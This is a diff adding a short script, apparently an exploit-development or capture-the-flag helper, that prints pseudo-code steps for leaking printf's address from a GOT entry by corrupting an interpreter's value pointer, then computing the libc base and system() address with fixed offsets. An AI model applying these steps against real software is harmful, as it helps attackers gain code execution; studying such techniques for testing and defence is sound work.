@@ -1,0 +1,25 @@
+print("=== Calculate system() Address from Leaked printf ===");
+
+print("Libc offsets:");
+print("  printf_offset = 0x60100");
+print("  system_offset = 0x58750");
+
+print("Step 1: Leak printf address from GOT");
+print("(This requires corrupting variable.value_ptr to printf@GOT first)");
+print("int libcprintf = target;");
+print("print(libcprintf);");
+
+print("Step 2: Calculate libc base");
+print("libc_base = libcprintf - 0x60100");
+
+print("Step 3: Calculate system address");
+print("system_addr = libc_base + 0x58750");
+
+print("Note: This is pseudo-code. Actual calculation needs to be done");
+print("in bitscript using integer arithmetic, or in Python wrapper");
+
+print("Example calculation:");
+print("If libcprintf = 0x7ffff7e60100:");
+print("  libc_base = 0x7ffff7e60100 - 0x60100 = 0x7ffff7e00000");
+print("  system_addr = 0x7ffff7e00000 + 0x58750 = 0x7ffff7e58750");
+
